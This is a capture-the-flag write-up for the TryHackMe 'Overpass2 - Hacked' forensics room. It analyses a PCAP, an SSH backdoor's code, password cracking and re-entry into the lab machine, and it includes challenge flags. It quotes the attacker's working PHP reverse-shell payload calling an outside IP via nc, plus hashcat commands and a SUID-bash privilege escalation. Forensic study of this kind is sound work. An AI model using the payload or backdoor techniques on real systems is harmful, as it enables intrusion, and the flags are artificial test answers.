# Overpass2- Hacked Challenge Report
## Introduction
This TryHackMe challenge is excellent for learning **Digital Forensics and Incident Response (DFIR)**. We are given a PCAP file (network traffic capture) from a compromised Linux web server.

**Our goals are:**
- Understand how the attacker gained access
- Find the reverse shell payload
- Identify the privilege escalation password
- Discover how the attacker maintained persistence (backdoor)
- Analyse the backdoor code
- Crack passwords
- Get back into the machine and retrieve both user and root flags

---

## Walkthrough
## Task 1: Forensics- Analyse the PCAP
Open the provided PCAP file in **Wireshark**.

**Question:** What was the URL of the page they used to upload a reverse shell? <br>
**Answer:** `/development/` <br>

**How to find it (Step-by-step):**
1. In Wireshark, go to the filter bar and type:  
   `http.request.method == POST`
2. Apply the filter and look at the HTTP POST requests.
3. You will see a POST request to `/development/`.

This page allowed file uploads, and the attacker used it to upload a malicious PHP file containing a reverse shell.

<img width="953" height="354" alt="task 1 1" src="https://github.com/user-attachments/assets/45184ebb-c109-4842-8c23-8c8ad532ed17" /> <br>
_URL used to upload the reverse shell_

**What is a reverse shell?**  
A reverse shell is a technique where the compromised victim machine actively connects back to the attacker’s computer. This is very common because most firewalls allow outbound connections but block inbound ones.

**Question:** What payload did the attacker use to gain access? <br>
**Answer:** `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>` <br>

<img width="709" height="177" alt="task 1 2" src="https://github.com/user-attachments/assets/f30ba1dd-6a7c-478c-8c1d-37bf8a35a7d1" /> <br>
_Reverse shell payload used by attacker_

**Step-by-step explanation of the payload:**
- `rm /tmp/f` → Removes any old named pipe
- `mkfifo /tmp/f` → Creates a new named pipe (a special file for communication)
- `cat /tmp/f | /bin/sh -i 2>&1` → Runs an interactive shell and sends both output and errors
- `| nc 192.168.170.145 4242` → Sends everything to the attacker’s IP on port 4242
- `> /tmp/f` → Closes the loop

This gives the attacker a shell on the server.

**Question:** What password did the attacker use to privesc? <br>
**Answer:** `whenevernoteartinstant`

**How to find it:**
1. Apply a simple filter in Wireshark: `http`
2. Follow the TCP streams of the HTTP traffic.
3. You will see the attacker interacting with the server and typing (or using) this password to escalate privileges from a normal user to root/admin level.

<img width="1152" height="253" alt="task 1 3" src="https://github.com/user-attachments/assets/d3fd3520-ca2e-4d8a-b202-77b0d6a08ae8" /> <br>
_Password used by attacker for privilege escalation_

**Question:** How did the attacker establish persistence?

**Answer:** `https://github.com/NinjaJc01/ssh-backdoor`

<img width="1171" height="87" alt="task 1 4" src="https://github.com/user-attachments/assets/02b6fa5b-684f-491b-a90a-01cf92daf599" /> <br>
_Backdoor used by attacker for persistence_

**Steps observed in the PCAP:**
- The attacker cloned this GitHub repository.
- Installed and configured a custom SSH backdoor listening on port 2222.
- This allowed them to regain access even if the original reverse shell was closed.

**What is a backdoor?**  
A hidden method to access a system without going through normal login procedures.

**Question:** Using the fasttrack wordlist, how many of the system passwords were crackable? <br>
**Answer:** 4

## Task 2: Research - Analyse the code
Now we analyse the backdoor source code from the GitHub repository found earlier.

**Question:** What's the default hash for the backdoor? <br>
**Answer**: `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` 

<img width="1881" height="897" alt="task 2 1" src="https://github.com/user-attachments/assets/bbb89866-e9b5-4044-bace-900d37e02e73" />

_Default hash for the backdoor_

How to find it:
- Open the `main.go` file in the repository.
- Look for the variable named `hash`.

Question: What's the hardcoded salt for the backdoor?
Answer: **1c362db832f3f864c8c2fe05f2002a05**
**What is a salt?**
A random string added to a password before hashing. It makes precomputed attacks (like rainbow tables) much harder.
How the backdoor works (simplified):
1. User connects to the backdoor (port 2222).
2. They enter a password.
3. The backdoor adds the hardcoded salt to the password.
4. It computes SHA-512 hash of (password + salt).
5. If it matches the stored master hash → access granted and a shell is spawned.

<img width="1589" height="945" alt="task 2 2" src="https://github.com/user-attachments/assets/35ecdc48-711a-4f1a-a166-41d5b920b447" />

_Hard coded salt for the backdoor_

**Question:** What was the hash that the attacker used?- go back to the PCAP for this!
**Answer:** `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

<img width="1344" height="724" alt="task 2 3" src="https://github.com/user-attachments/assets/b5d5b3e4-cb9e-4252-a167-3e8980e0f0bf" />

_Hash used by the attacker_

How to find it:
- Go back to Wireshark.
- Follow the TCP stream where the attacker configures the backdoor.
- You will see them setting their own custom hash.

**Question:** Crack the hash using rockyou and a cracking tool of your choice. What's the password? <br>
**Answer:** `november16`

**Step-by-step cracking guide:**
1. Extract the password hashes and their salts from the system (usually from `/etc/shadow` or provided files).
2. Combine each hash with its salt in this format: `hash:salt`
3. Save them into a file called `hash.txt`
4. Use **hashcat** (very fast password cracker):

`hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt`

`-m 1710` is the mode for SHA512crypt.

## Task 3: Attack- Get back in
**Question:** The attacker defaced the website. What message did they leave as a heading? <br>
**Answer:** `H4ck3d by CooctusClan` <br>
<img width="1462" height="276" alt="task 3 1" src="https://github.com/user-attachments/assets/4481abd8-41cc-4e21-84c3-7290883a6dbb" /> <br>
_Defaced website_

Just visit the website in your browser to see the defaced page.

**Question:** Using the information you've found previously, hack your way back in! <br>
**Answer:** `No answer needed.`

Steps:
1. Use the cracked password: november16
2. Connect via the backdoor SSH port:

`ssh james@<machine-ip> -p 2222`

Enter password `november16` when prompted.

Question: What's the user flag? <br>
Answer: **thm{d119b4fa8c497ddb0525f7ad200e6567}** <br>
<img width="800" height="77" alt="task 3 3" src="https://github.com/user-attachments/assets/f23ae5c8-55d7-4ff2-bf6c-f652e72bc96f" /> <br>
_User flag_

After logging in as user `james`, run:
`ls <br>
cat user.txt`

The flag is usually in `/home/james/user.txt`

Don't bother about the commands I used, they give the same results.

**Question:** What's the root flag? <br>
**Answer:** `thm{d53b2684f169360bb9606c333873144d}` <br>
<img width="451" height="74" alt="task 3 4 " src="https://github.com/user-attachments/assets/8a419f40-d3aa-4073-a769-3c8d83f13316" /> <br>
_Root flag_
Privilege Escalation Steps:
1. Clone and use the [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) script from GitHub to find privilege escalation paths
2. Look for hidden files: `ls -la`
3. You will find a hidden SUID binary called `.suid_bash`
4. Run it with the -p flag to preserve privileges:

`./.suid_bash -p`

You should now be root. Go to `/root/` and read the flag.

## Conclusion
This challenge gave us practical experience in:
- Network traffic analysis with Wireshark
- Reverse shell understanding
- Password cracking with Hashcat
- Static analysis of backdoor code
- Privilege escalation techniques
- Digital Forensics workflow

These skills are very valuable for anyone interested in Cybersecurity Operations, Blue Teaming, or Digital Forensics.
